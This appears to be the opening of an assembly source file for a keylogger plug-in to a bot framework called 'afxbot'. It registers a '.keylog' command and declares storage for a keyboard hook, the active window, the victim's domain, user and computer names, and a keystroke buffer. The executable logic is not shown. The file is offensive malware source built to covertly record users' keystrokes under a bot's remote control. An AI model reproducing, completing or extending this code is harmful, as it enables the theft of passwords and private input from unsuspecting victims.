;-----------------------------------------------------------------------
include     includes.inc
include     ..\..\common\project.inc
includelib  ..\..\afxbot\bin\afxbot.lib

;-----------------------------------------------------------------------
.data
    mdt MODULE_DESCRYPTION_TABLE <'keylog mod', '0.1', <'.keylog', _MODULE_TYPE_PRVMSG, offset start_keylogger>>
    
;-----------------------------------------------------------------------
.data?
    lpbot_info    dword   ?
    
    _buffer_index   dword   ?
    hhook           dd  ?
    msg             MSG <>
    hcurrentwindow      dword   ?
    hcurrentthreadpid   dword   ?
    hmodule             MODULEENTRY32 <>
    hsnapShot           dword   ?
    
    dwbuffer1       dd  ?
    szdomainname    db  128 dup(?)
    szusername      db  32 dup(?)
    szcompname      db  32 dup(?)
    
    szreply         db  64 dup(?)
    szkeylog_buffer db  256 dup(?)

;-----------------------------------------------------------------------

